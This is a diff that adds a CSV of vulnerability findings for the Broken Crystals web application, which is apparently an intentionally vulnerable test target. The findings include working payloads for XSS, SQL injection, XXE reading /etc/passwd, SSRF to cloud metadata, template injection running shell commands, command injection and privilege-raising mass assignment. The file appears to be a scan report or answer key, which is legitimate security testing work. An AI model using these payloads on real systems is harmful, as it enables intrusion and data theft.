@@ -1,0 +1,37 @@
+Location (Endpoint),Vulnerability Type,Payload,Vulnerability Description
+/api/auth/login,A07:2021-Identification and Authentication Failures; API2:2023-Broken Authentication,"{""user"":""admin"",""password"":""admin"",""op"":""basic""}",Brute force/default creds allowed (admin/admin). No rate limiting or lockout.
+"Cookies: connect.sid, bc-calls-counter",A05:2021-Security Misconfiguration; API8:2023-Security Misconfiguration,,Missing HttpOnly and Secure flags on cookies.
+CORS (global),A05:2021-Security Misconfiguration; A01:2021-Broken Access Control (CSRF); API8:2023-Security Misconfiguration,,"Access-Control-Allow-Origin: * for all responses, enabling CSRF and cross-origin abuse."
+/api/subscriptions,A01:2021-Broken Access Control (CSRF); API5:2023-Broken Function Level Authorization,"<form action=""https://brokencrystals.com/api/subscriptions?email=%3Cscript%3Ealert(1)%3C/script%3E"" method=""POST""></form>",CSRF-able state change with DOM XSS via unsanitized email param reflected into page.
+Homepage query param __dummy,A03:2021-Injection (XSS),https://brokencrystals.com/?__dummy=__<script>alert('XSS')</script>,Reflected DOM XSS via __dummy parameter injected into DOM without sanitization.
+Homepage query param maptitle,A03:2021-Injection (XSS),https://brokencrystals.com/?maptitle=<script>alert('XSS')</script>,Reflected DOM XSS via maptitle parameter.
+/api/testimonials/count,"A03:2021-Injection (SQLi, Reflected XSS)",?query=;SELECT%20PG_SLEEP(5)--,Time-based SQLi in query parameter; also supports reflected XSS payloads.
+/api/products/views,A03:2021-Injection (SQLi),Header x-product-name: Opal' ; SELECT PG_SLEEP(5)--,SQLi via x-product-name header used in UPDATE query without sanitization.
+/api/metadata (POST),A05:2021-Security Misconfiguration (XXE); A03:2021-Injection (XSS),"<?xml version=""1.0""?><!DOCTYPE r [<!ENTITY xxe SYSTEM 'file://etc/passwd'>]><root>&xxe;</root>",External entities enabled leading to file disclosure; also reflects XML/SVG allowing XSS.
+/api/file,A10:2021-SSRF; API7:2023-Server-Side Request Forgery,?path=http://169.254.169.254/latest/meta-data/,Server fetches arbitrary URLs including cloud metadata endpoints (SSRF).
+/api/file/raw,A01:2021-Broken Access Control (Path Traversal/LFI),?path=/etc/hosts,Unrestricted file read of arbitrary server files (LFI).
+/api/render,A03:2021-Injection (SSTI),{{= global.process.mainModule.require('child_process').execSync('id') }},Server-side template injection using doT executes arbitrary commands.
+/api/spawn,A03:2021-Injection (OS Command Injection),?command=uname%20-a,Executes shell command supplied by attacker.
+/graphql (getCommandResult),A03:2021-Injection (OS Command Injection),GraphQL variables: {'getCommandResult_command':'/bin/cat /etc/passwd'},GraphQL resolver executes untrusted command input.
+/api/users/basic (POST),A01:2021-Broken Access Control; API3:2023-Broken Object Property Level Authorization (Mass Assignment),"{""email"":""u"",""password"":""p"",""isAdmin"":true,""op"":""basic""}",Mass assignment allows privilege escalation by setting hidden isAdmin field.
+/api/users/one/{email}/info (PUT),A01:2021-Broken Access Control; API3:2023-BOPLA (Mass Assignment),"{""firstName"":""A"",""isAdmin"":true}","Updating user info accepts isAdmin field, granting admin."
+/api/users/one/{email}/adminpermission,A01:2021-Broken Access Control; API5:2023-BFLA,,Admin permission check endpoint reveals privilege state; combined with mass assignment enables escalation.
+/users/id/:id (GET),A01:2021-Broken Access Control (IDOR); API1:2023-BOLA,:id=2,Unauthenticated endpoint returns user info by ID (ID enumeration/BOLA).
+/users/one/:id/photo?isAdmin=true (DELETE),A01:2021-Broken Access Control; API5:2023-BFLA,?isAdmin=true,Broken function-level authorization lets deletion of arbitrary users' photos by toggling isAdmin param.
+/api/products/latest,A01:2021-Broken Access Control; API6:2023-Unrestricted Access to Sensitive Business Flows,?limit=1000,Business constraint bypass to dump product list without authentication.
+/adminpage and /api/users/search,A01:2021-Broken Access Control; API3:2023-BOPLA (Excessive Data Exposure),,"Admin page exposes user PII (cardNumber, phoneNumber) via API response."
+/api/email/sendSupportEmail,A03:2021-Injection (Prototype Pollution); A03:2021-Injection (Email Header Injection),?name=Bob&to=user%40email.com%0aCc:%20attacker@ex.com&subject=Hi&content=Help,Email header injection to add unintended recipients; server-side prototype pollution via __proto__ params.
+/api/partners/partnerLogin,A03:2021-Injection (XPath Injection),password=' or '1'='1,Boolean-based XPath injection returns multiple users incl. credentials.
+/api/partners/searchPartners,A03:2021-Injection (XPath Injection),')] | //password%00//,XPath string-detection payload discloses sensitive fields like passwords.
+/api/partners/query,A03:2021-Injection (XPath Injection),Arbitrary XPath expression,Raw XPath query endpoint permits arbitrary queries and error-based extraction.
+/api/users/one/{email}/photo (PUT),A05:2021-Security Misconfiguration (Unrestricted File Upload),multipart upload of EICAR as .exe with image/png Content-Type,No validation/AV on uploaded avatar; arbitrary file types accepted and served back.
+/api/goto,A01:2021-Broken Access Control (Open Redirect),?url=https://malicious-site.com,Unvalidated redirect to attacker-controlled domains.
+/api/secrets,A05:2021-Security Misconfiguration; API8:2023-Security Misconfiguration (Sensitive Info Exposure),,"Endpoint leaks API keys, tokens (CodeClimate, Slack, PayPal, etc.)."
+/api/config,A05:2021-Security Misconfiguration; API8:2023-Security Misconfiguration,,Leaked configuration incl. DB connection string and Google Maps API key.
+/vendor/ (static),A05:2021-Security Misconfiguration (Directory Listing),,"Directory listing enabled, exposing asset inventory."
+"Common files: /.htaccess, /nginx.conf",A05:2021-Security Misconfiguration,,Sensitive config files accessible under web root.
+"/.git/, /.hg/ (static)",A05:2021-Security Misconfiguration,,Version control metadata exposed; can leak source and secrets.
+"Error response (e.g., /api/products/views with bad header)",A05:2021-Security Misconfiguration (Information Leakage),Header x-product-name: Opal',Full Path Disclosure of internal file paths in JSON error.
+"Homepage /marketplace param videosrc, maptitle iframe",A03:2021-Injection (HTML/iFrame Injection),?videosrc=javascript:alert(1),IFrame src/title controlled by URL param enabling script injection.
+"Static JS assets (jQuery, Bootstrap, Swagger UI)",A06:2021-Vulnerable and Outdated Components,,"Known CVEs present in bundled JS libraries (e.g., CVE-2024-6531)."
+/chat (LLM output),A03:2021-Injection (XSS) / Insecure Output Handling,LLM response containing <script>alert(1)</script>,"Unsanitized model output rendered directly, enabling script execution."
